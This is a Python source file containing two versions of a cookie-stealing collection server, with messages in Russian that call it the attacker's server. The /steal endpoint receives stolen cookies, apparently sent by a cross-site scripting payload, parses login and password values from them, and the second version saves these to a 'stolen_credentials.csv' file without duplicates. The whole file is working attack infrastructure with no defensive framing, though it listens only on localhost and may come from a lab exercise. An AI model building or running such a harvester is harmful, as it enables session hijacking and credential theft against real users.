'''from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs


class StealHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)

        if parsed.path == '/steal':
            query = parse_qs(parsed.query)
            cookie = query.get("cookie", [""])[0]
            print(f"[!!!] Похищенные куки: {cookie}\n")

            # Дополнительно — вытаскиваем логин и пароль из куки (если ты оставил их в cookie)
            if "login=" in cookie and "password=" in cookie:
                try:
                    parts = cookie.split(";")
                    creds = {kv.split("=")[0].strip(): kv.split("=")[1].strip() for kv in parts if "=" in kv}
                    print(f"[+++] Логин: {creds.get('login')}, Пароль: {creds.get('password')}")
                except Exception as e:
                    print(f"[!] Ошибка при разборе куки: {e}")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")


if __name__ == "__main__":
    server = HTTPServer(('127.0.0.1', 9000), StealHandler)
    print("[*] Сервер злоумышленника слушает на 127.0.0.1:9000...")
    server.serve_forever()'''

import csv
import os
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs


class StealHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)

        if parsed.path == '/steal':
            query = parse_qs(parsed.query)
            cookie = query.get("cookie", [""])[0]
            print(f"[!!!] Похищенные куки: {cookie}\n")

            # Extract credentials from cookie
            creds = {}
            if "login=" in cookie and "password=" in cookie:
                try:
                    parts = cookie.split(";")
                    creds = {kv.split("=")[0].strip(): kv.split("=")[1].strip() for kv in parts if "=" in kv}
                    print(f"[+++] Логин: {creds.get('login')}, Пароль: {creds.get('password')}")
                except Exception as e:
                    print(f"[!] Ошибка при разборе куки: {e}")

            # Store credentials in CSV
            csv_file = "stolen_credentials.csv"
            file_exists = os.path.isfile(csv_file)

            # Read existing credentials to check for duplicates
            existing_creds = set()
            if file_exists:
                with open(csv_file, mode='r', newline='', encoding='utf-8') as f:
                    reader = csv.DictReader(f)
                    for row in reader:
                        existing_creds.add((row['login'], row['password']))

            # Write new credentials if they don't already exist
            if creds and (creds.get('login'), creds.get('password')) not in existing_creds:
                with open(csv_file, mode='a', newline='', encoding='utf-8') as f:
                    writer = csv.DictWriter(f, fieldnames=['login', 'password', 'cookie'])
                    if not file_exists:
                        writer.writeheader()
                    writer.writerow({
                        'login': creds.get('login', ''),
                        'password': creds.get('password', ''),
                        'cookie': cookie
                    })
                    print(f"[+++] Credentials saved to {csv_file}")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")


if __name__ == "__main__":
    server = HTTPServer(('127.0.0.1', 9000), StealHandler)
    print("[*] Сервер злоумышленника слушает на 127.0.0.1:9000...")
    server.serve_forever()